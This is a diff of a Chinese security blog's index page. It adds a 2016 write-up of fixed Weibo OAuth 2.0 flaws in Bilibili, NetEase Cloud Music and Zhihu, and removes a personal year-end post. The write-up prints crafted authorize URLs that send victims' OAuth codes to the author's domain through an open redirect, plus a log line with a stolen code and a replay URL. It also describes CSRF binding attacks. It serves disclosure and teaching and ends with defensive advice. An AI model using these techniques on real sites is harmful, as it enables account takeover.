@@ -259,6 +259,166 @@
             
               
                 
+                <a class="post-title-link" href="/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/" itemprop="url">
+                  “脆弱”的微博OAuth 2.0
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-02-16T22:19:40+08:00" content="2016-02-16">
+              2016-02-16
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/02/16/The-Weakness-of-Weibo-OAuth2-0/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。</p>
+<h2 id="新浪微博的OAuth-2-0"><a href="#新浪微博的OAuth-2-0" class="headerlink" title="新浪微博的OAuth 2.0"></a>新浪微博的OAuth 2.0</h2><p>接下来以开发者的角度来描述一下登录的过程。</p>
+<ol>
+<li>用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：<code>https://api.weibo.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&amp;response_type=code&amp;redirect_uri=YOUR_REGISTERED_REDIRECT_URI</code></li>
+<li>用户填写微博的账号及密码，同意授权后新浪微博会将页面跳转到<code>YOUR_REGISTERED_REDIRECT_URI/?code=CODE</code></li>
+<li>后台通过这个接口就可以拿到用户的授权码，使用这个code，我们就可以在后台通过新浪提供的API：<code>https://api.weibo.com/oauth2/access_token?client_id=YOUR_CLIENT_ID&amp;client_secret=YOUR_CLIENT_SECRET&amp;grant_type=authorization_code&amp;redirect_uri=YOUR_REGISTERED_REDIRECT_URI&amp;code=CODE</code>，获取访问用户资源的Access Token，从而使用用户的身份完成一些授权的操作，如获取微博的账号信息。</li>
+</ol>
+<p>而在一些网站应用中，也允许用户的账号去绑定新浪微博的账号，然后就可以通过新浪微博进行登录，例如知乎，其绑定账号的过程也是类似上面的流程。</p>
+<p>相关链接：<a href="http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E" target="_blank" rel="external">Web网站的授权</a></p>
+<h2 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h2><h3 id="0x00-绑定接口的CSRF"><a href="#0x00-绑定接口的CSRF" class="headerlink" title="0x00 绑定接口的CSRF"></a>0x00 绑定接口的CSRF</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0169000" target="_blank" rel="external">点我的链接我就可能会进入你的B站账号</a></p>
+<p>首先得感谢一下<a href="http://wooyun.org/whitehats/%E5%91%86%E5%AD%90%E4%B8%8D%E5%BC%80%E5%8F%A3" target="_blank" rel="external">@呆子不开口</a>，这个姿势是从他那里学习来的。用一句话总结一下：发起绑定第三方账号的接口存在CSRF问题，导致用户点击攻击者构造的页面后，攻击者的微博就绑定到了用户的账号下，从而造成攻击者能以受害用户的身份登录网站。接下来我将以B站之前存在的漏洞来说明构造攻击页面的过程。</p>
+<ol>
+<li>在攻击页面中，用户点击页后，我们要先在用户的浏览器上登录指定的微博账号。注意该账号要先授权给bilibili，因为新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动跳过前面的授权步骤直接完成绑定。登录微博的过程我用的方式比较简单粗暴，使用的是<code>http://weibo.cn</code>的登录接口。注：当时这个接口不需要验证码，现已加上，所以也就不存在登录CSRF的问题了。</li>
+<li>登录微博完成后，我们利用js在页面中插入一个<code>img</code>标签，指定src为<code>https://account.bilibili.com/login?sns=weibo</code>，加载完成后，我们的微博账号就绑定到了用户的账号中。</li>
+</ol>
+<h3 id="0x01-没有完整验证绑定流程"><a href="#0x01-没有完整验证绑定流程" class="headerlink" title="0x01 没有完整验证绑定流程"></a>0x01 没有完整验证绑定流程</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0170272" target="_blank" rel="external">点我的链接我就可能会进入你的网易云音乐</a></p>
+<p>网易云音乐的绑定微博账号流程如下：</p>
+<ol>
+<li>GET <code>http://music.163.com/api/sns/authorize?callbackType=Binding&amp;clientType=web2&amp;forcelogin=true&amp;snsType=2&amp;csrf_token=d0728eed66ae5189b66579d943559dc4</code></li>
+<li>302调整到：<code>https://api.weibo.com/oauth2/authorize?client_id=301575942&amp;response_type=code&amp;redirect_uri=http://music.163.com/back/weibo&amp;scope=friendships_groups_read,statuses_to_me_read,follow_app_official_microblog&amp;state=pYkkCeJkYU&amp;forcelogin=true&amp;csrf_token=d0728eed66ae5189b66579d943559dc4</code></li>
+<li>用户授权完成后，跳转到<code>http://music.163.com/back/weibo?state=pYkkCeJkYU&amp;code=0e9e160fbbec0955f6e04a7c79b2e5fb</code></li>
+</ol>
+<p>可以看到，发起绑定的接口用了<code>csrf_token</code>参数来防止CSRF攻击，因此不存在上面提到的问题。然而百密一疏，我们可以跳过第一步，直接引导用户到第二步，如果第三步<code>/back/weibo</code>这个接口没有验证state参数同时也没有验证用户是否主动发起过绑定，那么我们就可以用先登录指定微博，然后将该微博绑定到用户账号的方式，获取用户登录网易云音乐的权限。state参数就是用来防止这种情况的，然而云音乐的开发者并没有好好用上，引用一下新浪的文档：</p>
+<blockquote>
+<p>用于保持请求和回调的状态，在回调时，会在Query Parameter中回传该参数。开发者可以用这个参数验证请求有效性，也可以记录用户请求授权页前的位置。这个参数可用于防止跨站请求伪造（CSRF）攻击</p>
+</blockquote>
+<p>具体的过程如下：</p>
+<ol>
+<li>用户登录了网易云音乐，点击了攻击者的链接</li>
+<li>在攻击者的页面中，主要过程是利用新浪微博的登录接口先登录攻击者的微博账号，注：攻击者的微博账号需要先授权给网易云音乐并关注，然后前端偷偷跳转到下面的地址，就可以将攻击者的微博账号绑定到用户的账号中<code>https://api.weibo.com/oauth2/authorize?client_id=301575942&amp;response_type=code&amp;redirect_uri=http://music.163.com/back/weibo&amp;scope=friendships_groups_read,statuses_to_me_read,follow_app_official_microblog</code></li>
+<li>攻击者利用自己的微博账号即可登录受害者的网易云音乐的账号</li>
+</ol>
+<h3 id="0x02-用户授权code被盗"><a href="#0x02-用户授权code被盗" class="headerlink" title="0x02 用户授权code被盗"></a>0x02 用户授权code被盗</h3><p>先说一下效果，用户在微博点击我构造好的URL之后，我就可以骗到该用户的授权code，利用这个code我们就可以以用户的身份登录其授权过的某些网站。至于要怎么做到，后面我用知乎的例子来说明吧，目前也修复了。</p>
+<p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="external">微博上你点我链接我就上你绑定过的知乎账号</a>和<a href="http://wooyun.org/bugs/wooyun-2016-0175030" target="_blank" rel="external">微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）</a> </p>
+<p>在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的<a href="https://www.zhihu.com/question/37062603/answer/71139922" target="_blank" rel="external">答案</a>中 ，里面的URL都是类似这样子的<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">https</span>://link.zhihu.com/?target=<span class="keyword">http</span>%<span class="number">3</span><span class="comment">A//www.wooyun.org/whitehats/zhchbin</span></span><br></pre></td></tr></table></figure></p>
+<p>这个URL能够跳转到任意的网址，且不需要用户确认！我们可以利用这个问题来做什么的？接下来就看我一步步构造一个恶意的URL。上面的接口是HTTPS的，而我的网站只支持HTTP，为了从<code>referrer</code>偷到用户的code信息，所以我先试了一下http是否可以，发现是没问题的。课外知识：<a href="http://serverfault.com/questions/520244/referer-is-passed-from-https-to-http-in-some-cases-how" target="_blank" rel="external">关于https -&gt; http 跳转的referrer</a></p>
+<p>NEXT：知乎登录页面中的微博登录是跳转到如下的URL：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//api.weibo.com/oauth2/authorize?</span></span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=https%<span class="number">3</span>A%<span class="number">2F</span>%<span class="number">2F</span>www.zhihu.com%<span class="number">2F</span>oauth%<span class="number">2F</span>callback%<span class="number">2F</span>login%<span class="number">2F</span>sina&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=<span class="number">3063806388</span></span><br></pre></td></tr></table></figure>
+<p>由之前的基础知识我们可以知道，要想拿到code，就得利用<code>redirect_uri</code>参数跳转到我们自己的网站。但是这里有个域名的限制，如果你把redirect_uri直接改成其他网站，微博是会报<code>(error:redirect_uri_mismatch)</code>错误的，所以我们只能使用知乎下的域名。经测试：在接入微博登录的过程中，微博开放平台会要求验证域名是否属于我们。如果填入的域名是xxx.com，则该域名和其子域名下的任何接口都能与<code>client_id</code>匹配而不会报错。而测试后我猜测知乎用的域名是<code>zhihu.com</code>，所以<code>link.zhihu.com</code>也能与client_id匹配。所以利用上面的接口，构造出以下的URL：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//api.weibo.com/oauth2/authorize?</span></span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=http%<span class="number">3</span>A%<span class="number">2F</span>%<span class="number">2F</span>link.zhihu.com%<span class="number">2F</span>%<span class="number">3F</span>target%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2F</span>%<span class="number">2F</span>a.zhchbin.xyz%<span class="number">2F</span>auth%<span class="number">3F</span>&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=<span class="number">3063806388</span></span><br></pre></td></tr></table></figure>
+<p>一个在授权过知乎的微博用户点击上面的URL后，新浪微博就会加上code参数并自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;<span class="keyword">state</span>=e9887b485320b0cab80b0d029e92759f&amp;code=<span class="number">776</span>b93bbf6b2474067f593d743f36380</span><br></pre></td></tr></table></figure>
+<p>NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[31/Jan/2016:15:28:31 +0800]</span> <span class="string">"<span class="keyword">GET</span> /auth? HTTP/1.1"</span> <span class="number">404</span> <span class="number">402</span> <span class="string">"http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=ad3d1b20385f891a36e498cb470146e5"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36"</span> <span class="string">"2.94"</span></span><br></pre></td></tr></table></figure></p>
+<p>拿到这个code参数之后，在我们自己的浏览器中打开下面的链接，就可以以受害用户的身份来登录知乎了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.zhihu.com/oauth/callback/login/sina?</span><br><span class="line">state=<span class="number">17324074</span>ce<span class="number">785e62960</span>61cf<span class="number">1381f6f8</span>b&amp;</span><br><span class="line">code=ad<span class="number">3d1b20385</span>f<span class="number">891a36e49</span>8cb<span class="number">470146e5</span></span><br></pre></td></tr></table></figure>
+<p>其中state参数的值是知乎首页的cookie中_xsrf对应的值。目前知乎已经修复这个问题，具体的修复方式就没有认真研究，我觉得最好的方式是在URL跳转前加一个安全提示，让用户确认的。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以发现OAuth2.0整个过程中都有不少容易被忽略的点，这里总结一下我认为的要写好第三方通信证登录及账号绑定需要注意的事情：</p>
+<ol>
+<li>发起绑定的接口不能存在CSRF问题。鬼知道用户浏览器上登录的微博账号就一定是用户的呢，你说对不。</li>
+<li>用好OAuth2.0的State参数，用的好，就不会有上面提到的网易云音乐类似问题，还是要防止CSRF问题的。RFC中对这个参数是推荐的哦。</li>
+<li>我觉得OAuth2.0的认证服务器在给开发者接入的时候应该要求使用完整的redirect_uri参数，而不是域名。而对于开发者，你无法改变微博的登记方式，只能让自己的站点不要存在任意URL调整的问题，比如能在跳转到其他站点前提示一下用户就提示一下。注：网易通信证那个问题，也是一个奇葩的任意URL跳转。</li>
+</ol>
+<p>PS：我书读得少，脑子不好使，以上内容如有错误，请和谐点指出。</p>
+<p>最后还是要放几个链接：</p>
+<ul>
+<li><a href="http://drops.wooyun.org/web/12695" target="_blank" rel="external">http://drops.wooyun.org/web/12695</a></li>
+<li><a href="http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod" target="_blank" rel="external">http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod</a></li>
+<li><a href="https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt" target="_blank" rel="external">https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt</a></li>
+<li><a href="http://drops.wooyun.org/papers/598" target="_blank" rel="external">http://drops.wooyun.org/papers/598</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/01/31/CRLF-Injection-and-Bypass-WAF/" itemprop="url">
                   CRLF Injection and Bypass Tencent WAF
                 </a>
@@ -372,127 +532,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/12/26/2015-summary/" itemprop="url">
-                  2015的无聊总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-12-26T19:12:31+08:00" content="2015-12-26">
-              2015-12-26
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015/12/26/2015-summary/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/26/2015-summary/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。</p>
-<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul>
-<li>2月份在家过完年很早就回到学校，完成一件很久之前一直要做但没敢去做的事情</li>
-<li>3，4，5月调整心情，在学校写毕业设计，5月份答辩完</li>
-<li>6月份毕业啦，在中大六年的生活就此落幕</li>
-<li>7月份开始工作了，人生开始变化，而我却还是那个我，波澜不惊的生活</li>
-<li>10月份开始培养业务爱好，除去美剧，日漫后另一个可以用来消磨时间的事情</li>
-</ul>
-<h3 id="毕业设计和毕业典礼"><a href="#毕业设计和毕业典礼" class="headerlink" title="毕业设计和毕业典礼"></a>毕业设计和毕业典礼</h3><p>我用心做了吗？没有。我用心写了吗？没有。毕设题目我现在好像已经快忘记得差不多，当时盲审的时候出来的结果居然有个B，被打回来修改后找导师签名才能过的那种，周围人都是一次性过，还好当时心态摆得比较平，只要不是不通过，我改就是了。后来当然就是答辩了，还算顺利，我被安排在下午。老师们估计也是听着觉得没意思，随便问了几个问题就过去了。早上在那里等了一个上午，结果轮到自己估计15分钟都不用就完事了，中间还没有去吃饭一直在那里准备！印象最深的是结束答辩后朋友圈刷起了“今天是个好日子”的歌！！哈哈！毕业设计算是给自己两年研究生生活的交代吧，虽然事后觉得很少，但是事前周围大家都渲染了恐怖的气氛，压力多少还是有一些的。</p>
-<p>完成毕业设计之后迎来的当然是估计这辈子都不会再有的猪一样的生活了，那段时间可以无忧无虑地在校园里享受最后的大学时光，每天想去打球就去打球，一周估计有三次吧！当然后果就是：在越来越黑的路上越走越远啊。打完球一身汗坐在篮球场上仰望星空，等待一切该发生的事情。学院毕业那天随便过去拍拍照就完了，感觉天太热叫朋友来一起拍照太麻烦，我还是选择跟本科毕业一样低调了事。学院请吃饭那晚也没记得什么，心态变得很平淡，估计是老了吧。学校毕业典礼那天跟校长握了一下手，没有做什么突出的事情，也安安静静地结束了。</p>
-<h3 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h3><p>华丽丽地从一个学生仔变成社会人士，很庆幸的是我们这一行的圈子不需要太多的转变，最大的变化无非就是以前待在实验室，现在要每天待到办公室里面对电脑屏幕敲键盘。还有就是不能再任性的想几点起床就几点起床，晚上睡觉都要多告诉自己一声明天要上班，每逢周一心情会跟大家一样Down，周五下班有种释然的感觉。工作算轻松的吧，压力不大，部门还有一堆喜欢运动的同事，每周可以打球。唯一觉得该提的一件事就是新人转正的一个必要条件，在某个打字软件上速度要达到60。好吧，每天上班前练习40分钟到一个小时，中午休息的时候练一个小时，晚上下班后在公司练一个小时，回来后在自己电脑上再练多一会，最后总算有惊无险地通过。</p>
-<h3 id="这一年的业余爱好"><a href="#这一年的业余爱好" class="headerlink" title="这一年的业余爱好"></a>这一年的业余爱好</h3><ol>
-<li>看NBA，印象深刻的是雷霆最后进不了季后赛，感叹了一声：当你的命运掌握在别人的手里，再努力也没用。另外一个就是支持的球队金州勇士最后拿下了总冠军！以后有机会一定要去现场看一次NBA的比赛！</li>
-<li>追剧，小说，电影等。这一年追的美剧不少啊，苦逼的IT创业者之《硅谷》，民风淳朴的《哥谭》，各种奇怪能力的《神盾局特工》，每集都高潮迭起的《逍遥法外》，最喜欢的当数《黑客军团》，至今仍然印象深刻的对白：”You cry sometimes… Just like me. Because you are lonely. I don’t just hack you, Krista. I hack everyone – My friends, coworkers. But I’ve helped a lot of people. I want … A way out of loneliness… Just like you.”。我还记得看了《一公升的眼泪》，是的，每集都会流一公升的眼泪。对了，每晚睡觉前我还拿起了当年买的kindle看小说，看完了《肖申克的救赎》，半本《盗墓笔记》，《三体》，《三体II：黑暗森林》等。还追了一些日漫，有点多就不一一列举。当然，我学习也没有落下的，浏览完了几本技术书，也偶尔更新下博客。</li>
-<li>业务安全爱好者，从10月份起就在漏洞平台乌云上提交一些漏洞，等级从一个路人刷到了白帽子。黑客？我当然是个好人，引用别人一句话：“我提交漏洞，大多为了名利和自我价值实现，这些已让我有足够动机，不掺杂任何崇高的白帽子精神。”</li>
-</ol>
-<h3 id="值得吹牛的事情"><a href="#值得吹牛的事情" class="headerlink" title="值得吹牛的事情"></a>值得吹牛的事情</h3><ol>
-<li>给一个公司报告了一个他们软件上某个功能的Bug，得到了1000刀的奖励。钱虽然不多，但发现我的邮件里只写了几十个字，大概知识就是财富吧，哈哈。</li>
-<li>来自陌生人的红包：前段时间有上海某公司的一个人加我，发了我个200RMB的红包，另外还有一个北京某教育类创业公司CTO也加我微信给我发了66 RMB的红包。</li>
-</ol>
-<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>明显这一年过得挺奇怪的，送给自己一句话，希望明年有所改变：生于忧患死于安乐。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -538,7 +577,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">17</span>
+              <span class="site-state-item-count">18</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
